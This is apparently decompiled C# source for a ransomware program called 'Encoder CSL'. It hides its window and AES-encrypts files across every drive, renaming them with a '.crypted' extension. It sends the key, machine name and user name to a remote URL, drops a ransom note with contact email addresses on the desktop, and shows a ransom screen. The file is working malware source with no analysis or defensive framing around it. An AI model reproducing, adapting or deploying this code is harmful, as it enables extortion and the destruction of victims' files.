using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using PreEmptive.SoS.Client.Messages;
using PreEmptive.SoS.Runtime;

namespace EncoderCSL;

public class Form1 : Form
{
	private string targetURL = "http://encoder/index.php";

	private string userName = Environment.UserName;

	private string computerName = Environment.MachineName.ToString();

	private string userDir = "C:\\Users\\";

	private IContainer components;

	private Label label1;

	private Panel panel1;

	private Label label7;

	private Label label6;

	private Label label5;

	private Label label4;

	private Label label3;

	private Label label2;

	public Form1()
	{
		InitializeComponent();
		((Form)this).set_StartPosition((FormStartPosition)1);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)label6).set_Text(userName);
		((Control)label7).set_Text(computerName);
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
		Makeit();
		((Control)this).set_Visible(true);
		((Form)this).set_Opacity(50.0);
	}

	private void Form_Shown(object sender, EventArgs e)
	{
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 100, 23, 78, 19, 92, 34, 34, 65 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 2048);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public string Passwd(int length)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			Random random = new Random();
			while (0 < length--)
			{
				stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
			}
			return stringBuilder.ToString();
		}
		finally
		{
			Access.Send(new SessionLifeCycleMessage
			{
				Event = new EventInformation
				{
					Code = "Session.Stop"
				},
				Binary = Class4.smethod_0()
			}, bool_0: true);
			Access.Teardown();
		}
	}

	public void SendPassword(string password)
	{
		string text = "mid=" + computerName + "&user=" + userName + "&password=" + password + "&add_form=send";
		StreamReader streamReader = new StreamReader(WebRequest.Create(targetURL + "?" + text).GetResponse().GetResponseStream());
		streamReader.ReadToEnd();
		streamReader.Close();
	}

	public void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + ".crypted");
	}

	private void encryptDirectory(string location, string password)
	{
		string[] source = new string[2] { ".txtr", ".test" };
		string[] array = null;
		try
		{
			array = Directory.GetFiles(location);
		}
		catch (UnauthorizedAccessException)
		{
		}
		catch (Exception)
		{
		}
		catch
		{
		}
		if (array != null)
		{
			names names2 = default(names);
			names2.bool_0 = true;
			for (int i = 0; i < array.Length; i++)
			{
				string extension = Path.GetExtension(array[i]);
				if (source.Contains(extension))
				{
					try
					{
						names2.bool_1 = false;
						EncryptFile(array[i], password);
					}
					catch (Exception)
					{
						names2.bool_2 = true;
						names2.bool_0 = false;
					}
				}
			}
		}
		string[] array2 = null;
		try
		{
			array2 = Directory.GetDirectories(location);
		}
		catch (UnauthorizedAccessException)
		{
		}
		catch (Exception)
		{
		}
		catch
		{
		}
		if (array2 == null)
		{
			return;
		}
		for (int j = 0; j < array2.Length; j++)
		{
			try
			{
				encryptDirectory(array2[j], password);
			}
			catch (Exception)
			{
			}
		}
	}

	private void Makeit()
	{
		try
		{
			string password = Passwd(16);
			string[] logicalDrives = Environment.GetLogicalDrives();
			for (int i = 0; i < logicalDrives.Length; i++)
			{
				string location = logicalDrives[i] + "\\";
				encryptDirectory(location, password);
			}
			try
			{
				SendPassword(password);
				TextForUser();
			}
			catch (Exception)
			{
			}
		}
		finally
		{
			Access.Send(new SessionLifeCycleMessage
			{
				Event = new EventInformation
				{
					Code = "Session.Stop"
				},
				Binary = Class4.smethod_0()
			}, bool_0: true);
			Access.Teardown();
		}
	}

	public void TextForUser()
	{
		string[] contents = new string[1] { "Hello! Your NameOfFile has been encrypted. \n For decrypt NameOfFile, plese contact with: \n  suporthermes@cock.li or knyaz@cock.li \n Data for decryption: " + computerName + " " + userName };
		File.WriteAllLines(userDir + userName + "\\Desktop\\READ.txt", contents);
	}

	private void label3_Click(object sender, EventArgs e)
	{
	}

	private void panel1_Paint(object sender, PaintEventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		//IL_01eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f5: Expected O, but got Unknown
		//IL_0218: Unknown result type (might be due to invalid IL or missing references)
		//IL_0222: Expected O, but got Unknown
		//IL_02af: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b9: Expected O, but got Unknown
		//IL_0346: Unknown result type (might be due to invalid IL or missing references)
		//IL_0350: Expected O, but got Unknown
		//IL_03cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d7: Expected O, but got Unknown
		//IL_0454: Unknown result type (might be due to invalid IL or missing references)
		//IL_045e: Expected O, but got Unknown
		//IL_04ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0509: Expected O, but got Unknown
		label1 = new Label();
		panel1 = new Panel();
		label7 = new Label();
		label6 = new Label();
		label5 = new Label();
		label4 = new Label();
		label3 = new Label();
		label2 = new Label();
		((Control)panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft YaHei", 21.75f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label1).set_ForeColor(Color.Yellow);
		((Control)label1).set_Location(new Point(149, 32));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(547, 39));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Your files has been safely encrypted");
		((Control)panel1).set_BackColor(Color.White);
		((Control)panel1).get_Controls().Add((Control)(object)label7);
		((Control)panel1).get_Controls().Add((Control)(object)label6);
		((Control)panel1).get_Controls().Add((Control)(object)label5);
		((Control)panel1).get_Controls().Add((Control)(object)label4);
		((Control)panel1).get_Controls().Add((Control)(object)label3);
		((Control)panel1).get_Controls().Add((Control)(object)label2);
		((Control)panel1).set_Location(new Point(-4, 99));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(817, 305));
		((Control)panel1).set_TabIndex(1);
		((Control)panel1).add_Paint(new PaintEventHandler(panel1_Paint));
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label7).set_ForeColor(Color.DarkGreen);
		((Control)label7).set_Location(new Point(455, 200));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(60, 24));
		((Control)label7).set_TabIndex(5);
		((Control)label7).set_Text("label7");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label6).set_ForeColor(Color.DarkGreen);
		((Control)label6).set_Location(new Point(455, 176));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(60, 24));
		((Control)label6).set_TabIndex(4);
		((Control)label6).set_Text("label6");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label5).set_Location(new Point(310, 200));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(110, 24));
		((Control)label5).set_TabIndex(3);
		((Control)label5).set_Text("Machine ID:");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label4).set_Location(new Point(310, 176));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(76, 24));
		((Control)label4).set_TabIndex(2);
		((Control)label4).set_Text("User ID:");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft YaHei UI", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label3).set_ForeColor(Color.Red);
		((Control)label3).set_Location(new Point(69, 72));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(690, 78));
		((Control)label3).set_TabIndex(1);
		((Control)label3).set_Text("Don't try to decrypt files yourself! It can be damage your files forever!\r\n\r\n\r\n");
		((Control)label3).add_Click((EventHandler)label3_Click);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft YaHei UI", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label2).set_ForeColor(Color.Red);
		((Control)label2).set_Location(new Point(132, 24));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(568, 26));
		((Control)label2).set_TabIndex(0);
		((Control)label2).set_Text("Please open READ_ME file on your desktop for decryption\r\n");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(810, 400));
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Encoder CSL");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
